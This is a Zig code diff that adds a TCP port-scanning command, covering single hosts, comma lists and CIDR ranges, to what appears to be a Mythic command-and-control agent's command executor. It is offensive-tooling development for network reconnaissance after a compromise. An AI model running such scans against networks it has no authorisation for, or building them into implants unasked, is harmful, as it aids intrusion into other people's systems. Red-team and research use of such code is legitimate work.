@@ -38,6 +38,8 @@ pub const CommandExecutor = struct {
             return try self.deleteFile(task);
         } else if (std.mem.eql(u8, task.command, "deletedirectory")) {
             return try self.deleteDirectory(task);
+        } else if (std.mem.eql(u8, task.command, "portscan")) {
+            return try self.executePortscan(task);
         } else {
             return MythicResponse{
                 .task_id = task.id,
@@ -315,5 +317,101 @@ pub const CommandExecutor = struct {
             .completed = true,
             .status = "completed",
         };
+    }
+
+    fn executePortscan(self: *CommandExecutor, task: MythicTask) !MythicResponse {
+        const Parameters = struct {
+            host: []const u8,
+            ports: []const u8 = "22,80,443,445,3389,8080",
+            timeout_ms: u32 = 500,
+        };
+        const parsed = try json.parseFromSlice(Parameters, self.allocator, task.parameters, .{});
+        defer parsed.deinit();
+        const params = parsed.value;
+
+        var results = ArrayList(u8).empty;
+        defer results.deinit(self.allocator);
+
+        const ports = try parsePorts(self.allocator, params.ports);
+        defer self.allocator.free(ports);
+
+        try results.appendSlice(self.allocator, "Host                 Port   State\n");
+        try results.appendSlice(self.allocator, "----                 ----   -----\n");
+
+        var hosts_iterator = std.mem.splitScalar(u8, params.host, ',');
+        while (hosts_iterator.next()) |entry| {
+        const host = std.mem.trim(u8, entry, " ");
+        if (std.mem.indexOf(u8, host, "/") != null) {
+            try self.scanCidr(host, ports, params.timeout_ms, &results);
+        } else {
+            try self.scanHost(host, ports, params.timeout_ms, &results);
+        }
+    }
+
+        return MythicResponse{
+            .task_id = task.id,
+            .user_output = try results.toOwnedSlice(self.allocator),
+            .completed = true,
+            .status = "completed",
+        };
+    }
+
+    fn scanHost(self: *CommandExecutor, host: []const u8, ports: []const u16, timeout_ms: u32, results: *std.ArrayList(u8)) !void {
+        for (ports) |port| {
+            if (tcpProbe(self.io, host, port, timeout_ms)) {
+                const line = try std.fmt.allocPrint(self.allocator, "{s:<21}{d:<7}open\n", .{ host, port });
+                defer self.allocator.free(line);
+                try results.appendSlice(self.allocator, line);
+            }
+        }
+    }
+
+    fn scanCidr(self: *CommandExecutor, cidr: []const u8, ports: []const u16, timeout_ms: u32,results: *std.ArrayList(u8)) !void {
+        const slash = std.mem.indexOf(u8, cidr, "/") orelse return error.InvalidCidr;
+        const base_str = cidr[0..slash];
+        const prefix_len = try std.fmt.parseInt(u8, cidr[slash + 1 ..], 10);
+
+        const base_addr = try std.Io.net.Ip4Address.parse(base_str, 0);
+        const base_int = std.mem.readInt(u32, &base_addr.bytes, .big);
+
+        const host_bits: u5 = @intCast(32 - prefix_len);
+        const host_count: u32 = @as(u32, 1) << host_bits;
+
+        var i: u32 = 1;
+        while (i < host_count - 1) : (i += 1) {
+            const ip_int = (base_int & (~@as(u32, 0) << host_bits)) | i;
+            const ip_bytes = std.mem.toBytes(std.mem.nativeToBig(u32, ip_int));
+            var host_buf: [16]u8 = undefined;
+            const host = try std.fmt.bufPrint(&host_buf, "{}.{}.{}.{}", .{
+                ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3],
+            });
+            try self.scanHost(host, ports, timeout_ms, results);
+        }
+    }
+
+    fn tcpProbe(io: Io, host: []const u8, port: u16, timeout_ms: u32) bool {
+        _ = timeout_ms; // blocking IO. TODO: implement async version later
+        const ip4 = std.Io.net.Ip4Address.parse(host, port) catch return false;
+        const addr = std.Io.net.IpAddress{ .ip4 = ip4 };
+        const stream = addr.connect(io, .{ .mode = .stream } ) catch return false;
+        stream.close(io);
+        return true;
+    }
+
+    fn parsePorts(allocator: Allocator, ports_str: []const u8) ![]u16 {
+        var list = std.ArrayList(u16).empty;
+        var it = std.mem.splitScalar(u8, ports_str, ',');
+        while (it.next()) |token| {
+            const t = std.mem.trim(u8, token, " ");
+            if (std.mem.indexOf(u8, t, "-")) |dash| {
+                const lo = try std.fmt.parseInt(u16, t[0..dash], 10);
+                const hi = try std.fmt.parseInt(u16, t[dash + 1 ..], 10);
+                var p = lo;
+                while (p <= hi) : (p += 1) try list.append(allocator, p);
+            } else {
+                try list.append(allocator, try std.fmt.parseInt(u16, t, 10));
+            }
+        }
+        return list.toOwnedSlice(allocator);
     }
 };
